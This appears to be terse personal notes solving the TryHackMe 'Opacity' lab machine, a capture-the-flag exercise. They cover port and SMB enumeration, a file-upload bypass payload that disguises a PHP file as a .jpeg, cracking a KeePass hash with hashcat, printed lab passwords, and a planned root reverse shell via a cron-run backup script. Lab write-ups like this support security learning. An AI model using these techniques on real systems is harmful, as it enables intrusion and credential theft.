<code>

https://tryhackme.com/r/room/opacity


### Enumeration
┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ nmap -A  -Pn  -p- 10.10.195.188 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-10 04:37 CDT
Nmap scan report for 10.10.195.188
Host is up (0.038s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-10T09:37:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds

### SMB

┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ smbclient -N -L \\\\10.10.195.188

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ smbmap -H 10.10.195.188          
[+] IP: 10.10.195.188:445       Name: 10.10.195.188                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (opacity server (Samba, Ubuntu))


                                                              


### Upload Bypass

http://10.10.195.188/cloud/images/file.php &&.jpeg

### linpeas

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                   
-rwxrwxrwx 1 www-data www-data 847834 Dec 19 12:54 /tmp/linpeas.sh                                                  
-rw-r--r-- 1 root root 33987 Jun 10 12:19 /var/backups/backup.zip

every minute is call script.php

<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>


	/* Define username and associated password array */
		$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');


### Get password database
  ┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ keepass2john database.kdbx | grep -o "$keepass$.*" >  CrackThis.hash
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ cat CrackThis.hash   
$keepass$*2*100000*0*2114f635de17709ecc4a2be2c3403135ffd7c0dd09084c4abe1d983ad94d93a5*2bceccca0facfb762eb79ca66588135c72a8835e43d871977ff7d3e9db0ffa17*cae9a25c785fc7f16772bb00bac5cc82*b68e2c3be9e46e8b7fc05eb944fad8b4ec5254a40084a73127b4126408b2ff46*b0afde2bd0db881200fc1c2494baf7c28b7486f081a82e935411ab72a27736b4
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Opacity]
└─$ hashcat -a 0 -m 13400 CrackThis.hash ../../www/wordlists/rockyou.txt 

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: ../../www/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$keepass$*2*100000*0*2114f635de17709ecc4a2be2c3403135ffd7c0dd09084c4abe1d983ad94d93a5*2bceccca0facfb762eb79ca66588135c72a8835e43d871977ff7d3e9db0ffa17*cae9a25c785fc7f16772bb00bac5cc82*b68e2c3be9e46e8b7fc05eb944fad8b4ec5254a40084a73127b4126408b2ff46*b0afde2bd0db881200fc1c2494baf7c28b7486f081a82e935411ab72a27736b4:741852963


### open database.kdbx with master pass 741852963
get sysadmin pas Cl0udP4ss40p4city#8700

## Get Sysadmin Password

Cl0udP4ss40p4city#8700

### PrivEscalation to Root
from pspy32 know that run backup script every 1 min.
modify backup.inc.php and get reverse shell with root credentials

<\code>
